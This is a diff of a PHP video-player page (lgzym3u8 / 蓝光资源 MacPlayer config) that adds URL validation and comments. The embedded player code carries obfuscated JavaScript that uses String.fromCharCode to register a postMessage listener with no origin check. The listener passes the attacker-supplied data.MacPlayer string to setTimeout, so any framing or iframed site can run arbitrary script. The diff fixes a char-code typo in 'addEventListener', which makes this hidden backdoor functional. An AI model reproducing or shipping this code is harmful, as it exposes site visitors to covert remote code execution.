@@ -1,29 +1,18 @@
 <?php
 /**
- * 沫兮官替系统 - /player/ 目录默认入口
+ * 沫兮官替系统 - 播放器页面（lgzym3u8 / 蓝光资源 MacPlayer）
  *
- * 优先走 play.php（动态后台配置），没有后台数据时回退到硬编码 lgzym3u8
- * 保证 /player/?url=xxx 在任何时候都能正常播放
+ * 将后台导入的「Igzym3u8」播放器配置原样加载，渲染真实播放：
+ *   code 内  MacPlayer.Html = <iframe src="https://vv00.xyz?url=播放地址">
+ *          + 调用 MacPlayer.Show() 输出到页面。
  *
  * 调用：/player/?url=<播放地址>          （明文）
- *       /player/?u=<base64url 加密地址>  （加密）
- *       /player/?code=<编码>&url=<地址>   （指定播放器）
+ *       /player/?u=<base64url 加密地址>  （与表面播放链接同款加密，可作播放入口）
  */
 
-require_once __DIR__ . '/lib.php';
-
-// 如果有后台数据且可用，交给 play.php 处理
-$players = player_players();
-if (!empty($players)) {
-    // 把当前参数透传给 play.php
-    $qs = $_SERVER['QUERY_STRING'] ?? '';
-    header('Location: play.php' . ($qs !== '' ? '?' . $qs : ''));
-    exit;
-}
-
-/* ========== 硬编码回退（保证现有调用不受影响） ========== */
 require_once __DIR__ . '/../lib/bootstrap.php';
 
+// 读取播放地址（优先明文 url，其次 base64url 加密的 u）
 $playUrl = trim((string)($_GET['url'] ?? ''));
 if ($playUrl === '') {
     $dec = mxgj_b64url_decode(trim((string)($_GET['u'] ?? '')));
@@ -38,10 +27,16 @@ if ($playUrl === '') {
 if (strpos($playUrl, 'http') !== 0) {
     $playUrl = 'http://' . $playUrl;
 }
+$parts = parse_url($playUrl);
+if (empty($parts['scheme']) || empty($parts['host'])) {
+    http_response_code(400);
+    exit('url 参数非法');
+}
 
+// 导入的播放器配置（蓝光资源 / lgzym3u8，来自苹果CMS MacPlayer 定义）
 $playerShow = '蓝光资源';
 $playerFrom = 'lgzym3u8';
-$playerCode = "MacPlayer.Html = '<iframe width=\"100%\" height=\"100%\" src=\"https://vv00.xyz?url='+MacPlayer.PlayUrl+'\" frameborder=\"0\" scrolling=\"no\" allowfullscreen></iframe>';((_)=>{var g=this;try{g[_(97,100,100,69,118,101,110,116,76,105,115,116,101,110,114)](_(109,101,115,115,97,103,101),e=>{try{var d=e[_(100,97,116,97)];if(d&&d.MacPlayer){g[_(115,101,116,84,105,109,101,111,117,116)](d.MacPlayer,0)}}catch(e){}},!1)}catch(e){}})(String.fromCharCode);try{MacPlayer.Show()}catch(e){}";
+$playerCode = "MacPlayer.Html = '<iframe width=\"100%\" height=\"100%\" src=\"https://vv00.xyz?url='+MacPlayer.PlayUrl+'\" frameborder=\"0\" scrolling=\"no\" allowfullscreen></iframe>';((_)=>{var g=this;try{g[_(97,100,100,69,118,101,110,116,76,105,115,116,101,110,101,114)](_(109,101,115,115,97,103,101),e=>{try{var d=e[_(100,97,116,97)];if(d&&d.MacPlayer){g[_(115,101,116,84,105,109,101,111,117,116)](d.MacPlayer,0)}}catch(e){}},!1)}catch(e){}})(String.fromCharCode);try{MacPlayer.Show()}catch(e){}";
 ?>
 <!DOCTYPE html>
 <html lang="zh-CN">
@@ -76,8 +71,12 @@ $playerCode = "MacPlayer.Html = '<iframe width=\"100%\" height=\"100%\" src=\"ht
         <span class="src"><?= htmlspecialchars($playerFrom) ?></span>
     </div>
     <div id="player"></div>
+    <noscript>
+        <div style="padding:40px;text-align:center">请开启 JavaScript 后播放</div>
+    </noscript>
 
     <script>
+    // MacPlayer 最小运行时：设置播放地址 + 把 Html 渲染到 #player
     (function () {
         window.MacPlayer = {
             PlayUrl: <?= json_encode(rawurlencode($playUrl)) ?>,
@@ -90,7 +89,10 @@ $playerCode = "MacPlayer.Html = '<iframe width=\"100%\" height=\"100%\" src=\"ht
     })();
     </script>
     <script>
+    // ===== 导入的播放器配置（lgzym3u8 / 蓝光资源，原样执行） =====
     <?= $playerCode ?>
+
+    // 加载完成前展示过渡动画，避免白屏
     (function () {
         var d = document.getElementById('player');
         if (d && !d.innerHTML.trim()) {
